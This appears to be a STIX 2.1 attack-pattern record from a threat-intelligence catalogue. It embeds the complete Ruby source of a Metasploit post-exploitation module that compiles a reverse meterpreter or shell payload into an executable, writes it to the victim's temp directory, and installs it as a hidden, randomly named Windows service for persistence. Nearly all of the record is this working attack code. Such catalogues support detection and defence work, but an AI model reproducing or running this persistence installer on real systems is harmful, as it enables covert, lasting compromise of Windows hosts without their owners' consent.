{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1d783db1-efe7-4364-b252-a5724d8b7cb1",
    "created": "2024-08-14T16:48:55.493925Z",
    "modified": "2024-08-14T16:48:55.493929Z",
    "name": "Windows Persistent Service Installer",
    "description": " This Module will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/persistence_service.rb",
            "external_id": "persistence_service.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/external/source/metsvc/src/metsvc.cpp"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nrequire 'metasploit/framework/compiler/windows'\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Common\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Persistent Service Installer',\n        'Description' => %q{\n          This Module will generate and upload an executable to a remote host, next will make it a persistent service.\n          It will create a new service which will start the payload whenever the service is running. Admin or system\n          privilege is required.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Green-m <greenm.xxoo[at]gmail.com>' ],\n        'Platform' => [ 'windows' ],\n        'Targets' => [['Windows', {}]],\n        'SessionTypes' => [ 'meterpreter' ],\n        'DefaultTarget' => 0,\n        'References' => [\n          [ 'URL', 'https://github.com/rapid7/metasploit-framework/blob/master/external/source/metsvc/src/metsvc.cpp' ]\n        ],\n        'DisclosureDate' => '2018-10-20',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_sys_config_getenv\n              stdapi_sys_config_sysinfo\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('RETRY_TIME', [false, 'The retry time that shell connect failed. 5 seconds as default.', 5 ]),\n        OptString.new('REMOTE_EXE_PATH', [false, 'The remote victim exe path to run. Use temp directory as default. ']),\n        OptString.new('REMOTE_EXE_NAME', [false, 'The remote victim name. Random string as default.']),\n        OptString.new('SERVICE_NAME', [false, 'The name of service. Random string as default.' ]),\n        OptString.new('SERVICE_DESCRIPTION', [false, 'The description of service. Random string as default.' ])\n      ]\n    )\n  end\n\n  # Run Method for when run command is issued\n  #-------------------------------------------------------------------------------\n  def exploit\n    unless is_system? || is_admin?\n      print_error(\"Insufficient privileges to create service\")\n      return\n    end\n\n    unless datastore['PAYLOAD'] =~ %r#^windows/(shell|meterpreter)/reverse#\n      print_error(\"Only support for windows meterpreter/shell reverse staged payload\")\n      return\n    end\n\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n\n    # Set variables\n    rexepath = datastore['REMOTE_EXE_PATH']\n    @retry_time = datastore['RETRY_TIME']\n    rexename = datastore['REMOTE_EXE_NAME'] || Rex::Text.rand_text_alpha(4..8)\n    @service_name = datastore['SERVICE_NAME'] || Rex::Text.rand_text_alpha(4..8)\n    @service_description = datastore['SERVICE_DESCRIPTION'] || Rex::Text.rand_text_alpha(8..16)\n\n    # Add the windows pe suffix to rexename\n    unless rexename.end_with?('.exe')\n      rexename << \".exe\"\n    end\n\n    host, _port = session.tunnel_peer.split(':')\n    @clean_up_rc = \"\"\n\n    buf = create_payload\n    vprint_status(buf)\n    metsvc_code = metsvc_template(buf)\n    bin = Metasploit::Framework::Compiler::Windows.compile_c(metsvc_code)\n\n    victim_path = write_exe_to_target(bin, rexename, rexepath)\n    install_service(victim_path)\n\n    clean_rc = log_file\n    file_local_write(clean_rc, @clean_up_rc)\n    print_status(\"Cleanup Meterpreter RC File: #{clean_rc}\")\n\n    report_note(host: host,\n                type: \"host.persistance.cleanup\",\n                data: {\n                  local_id: session.sid,\n                  stype: session.type,\n                  desc: session.info,\n                  platform: session.platform,\n                  via_payload: session.via_payload,\n                  via_exploit: session.via_exploit,\n                  created_at: Time.now.utc,\n                  commands: @clean_up_rc\n                })\n  end\n\n  def create_payload\n    p = payload.encoded\n    Msf::Simple::Buffer.transform(p, 'c', 'buf')\n  end\n\n  # Function for writing executable to target host\n  # Code from post/windows/manage/persistence_exe\n  #\n  def write_exe_to_target(rexe, rexename, rexepath)\n    # check if we have write permission\n    if rexepath\n      begin\n        temprexe = rexepath + \"\\\\\" + rexename\n        write_file_to_target(temprexe, rexe)\n      rescue Rex::Post::Meterpreter::RequestError\n        print_warning(\"Insufficient privileges to write in #{rexepath}, writing to %TEMP%\")\n        temprexe = session.sys.config.getenv('TEMP') + \"\\\\\" + rexename\n        write_file_to_target(temprexe, rexe)\n      end\n\n    # Write to %temp% directory if not set REMOTE_EXE_PATH\n    else\n      temprexe = session.sys.config.getenv('TEMP') + \"\\\\\" + rexename\n      write_file_to_target(temprexe, rexe)\n    end\n\n    print_good(\"Meterpreter service exe written to #{temprexe}\")\n\n    @clean_up_rc << \"execute -H -i -f taskkill.exe -a \\\"/f /im #{rexename}\\\"\\n\" # Use interact to wait until the task ended.\n    @clean_up_rc << \"rm \\\"#{temprexe.gsub(\"\\\\\", \"\\\\\\\\\\\\\\\\\")}\\\"\\n\"\n\n    temprexe\n  end\n\n  def write_file_to_target(temprexe, rexe)\n    fd = session.fs.file.new(temprexe, \"wb\")\n    fd.write(rexe)\n    fd.close\n  end\n\n  # Function for creating log folder and returning log path\n  #-------------------------------------------------------------------------------\n  def log_file\n    # Get hostname\n    host = session.sys.config.sysinfo[\"Computer\"]\n\n    # Create Filename info to be appended to downloaded files\n    filenameinfo = \"_\" + ::Time.now.strftime(\"%Y%m%d.%M%S\")\n\n    # Create a directory for the logs\n    logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo))\n\n    # Create the log directory\n    ::FileUtils.mkdir_p(logs)\n\n    logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + \".rc\"\n  end\n\n  # Function to install payload as a service\n  #-------------------------------------------------------------------------------\n  def install_service(path)\n    print_status(\"Creating service #{@service_name}\")\n\n    begin\n      session.sys.process.execute(\"cmd.exe /c \\\"#{path}\\\" #{@install_cmd}\", nil, { 'Hidden' => true })\n    rescue ::Exception => e\n      print_error(\"Failed to install the service.\")\n      print_error(e.to_s)\n    end\n\n    @clean_up_rc = \"execute -H -f sc.exe -a \\\"delete #{@service_name}\\\"\\n\" + @clean_up_rc\n    @clean_up_rc = \"execute -H -f sc.exe -a \\\"stop #{@service_name}\\\"\\n\" + @clean_up_rc\n  end\n\n  def metsvc_template(buf)\n    @install_cmd = Rex::Text.rand_text_alpha(4..8)\n    @start_cmd = Rex::Text.rand_text_alpha(4..8)\n    template = File.read(File.join(Msf::Config.data_directory, 'exploits', 'persistence_service', 'service.erb'))\n    ERB.new(template).result(binding)\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-20",
    "x_mitre_platforms": [
        "[ 'windows' ]"
    ]
}